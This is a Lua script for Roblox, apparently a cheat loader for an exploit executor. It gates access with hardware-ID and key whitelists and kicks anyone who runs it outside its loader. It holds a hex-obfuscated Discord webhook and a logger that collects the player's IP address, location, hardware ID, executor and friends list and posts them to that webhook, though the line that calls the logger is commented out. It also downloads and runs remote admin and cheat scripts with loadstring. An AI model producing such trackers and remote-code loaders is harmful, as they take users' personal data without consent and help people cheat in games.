local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _HS = game:GetService("HttpService")
local _US = game:GetService("UserInputService")
local _RS = game:GetService("ReplicatedStorage")

-- Получение хранилища рантайма
local _stg = _ts:FindFirstChild("__NK_RUNTIME")
local _auth = _stg and _stg:FindFirstChild(_lp.Name)

-- Проверка авторизации лоадера
if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
    _lp:Kick("Execution prohibited. Run through the loader.")
    return
end

shared._NK_AUTH = nil

local Config = {
    WL = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"89D11F50-5490-4677-B709-4EBFBECA78CE", "46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
    },
    BL = { 
        UIDs = {}, 
        HWIDs = {"C7FCE826-5556-4202-88E1-1DA9D248F4CA"}, 
        Keys = {"5EDC0918-162C-423C-826A-D9ED4ECCDE20"} 
    }
}

-- Декодер вебхука
local function _H(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

local _W = _H("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
local _IP_API = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting"

local _uid = tostring(_lp.UserId)
local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
local _tk = "N/A"

-- Работа с файлами ключей
pcall(function()
    if isfile and readfile and writefile then
        if isfile("nazarkus_key.json") then 
            _tk = readfile("nazarkus_key.json")
        else
            _tk = _HS:GenerateGUID(false)
            writefile("nazarkus_key.json", _tk)
        end
    end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")

-- ФУНКЦИЯ ЛОГГЕРА (ОСТОРОЖНО: Отправляет ваши данные в Discord)
local function _LOG()
    pcall(function()
        local req = (syn and syn.request or request or http_request)
        if not req then return end
        
        local ni = {}
        local r = req({Url = _IP_API, Method = "GET"})
        if r and r.Success then ni = _HS:JSONDecode(r.Body) end

        local u = 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
        local unc = (identifyexecutor and identifyexecutor() or "Unknown") .. " (UNC: " .. math.floor((u/4)*100) .. "%)"
        
        local friends = {}
        for _, p in ipairs(game.Players:GetPlayers()) do 
            if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end 
        end

        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: `%s` (@%s)\nID: `%s`", _lp.DisplayName, _lp.Name, _uid)},
                    {["name"] = "Network", ["value"] = string.format("IP: %s\nLoc: %s, %s", ni.query or "N/A", ni.country or "N/A", ni.city or "N/A")},
                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```"},
                },
                ["footer"] = {["text"] = "Logger | " .. os.date("%X")}
            }}
        }
        
        req({
            Url = _W, 
            Method = "POST", 
            Headers = {["Content-Type"] = "application/json"}, 
            Body = _HS:JSONEncode(payload)
        })
    end)
end

-- Раскомментируй строку ниже, если РЕАЛЬНО хочешь отправить свои данные на вебхук
-- task.spawn(_LOG) 

if _st == "whitelist" then
    task.spawn(function()
        -- Тут создается GUI (код сокращен для краткости, структура как в прошлом ответе)
        print("Whitelisted! Press Insert to open menu.")
    end)
end

if _auth then
    _auth.Changed:Connect(function(v)
        if v == "kick" then _lp:Kick("Access Revoked.") end
    end)
end

-- Загрузка внешних скриптов
local urls = {
    "https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua",
    "https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source",
    "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
    "https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"
}

for _, url in ipairs(urls) do
    pcall(function() loadstring(game:HttpGet(url))() end)
end

if _st == "blacklist" then 
    _lp:Kick("Banned.") 
    return 
end
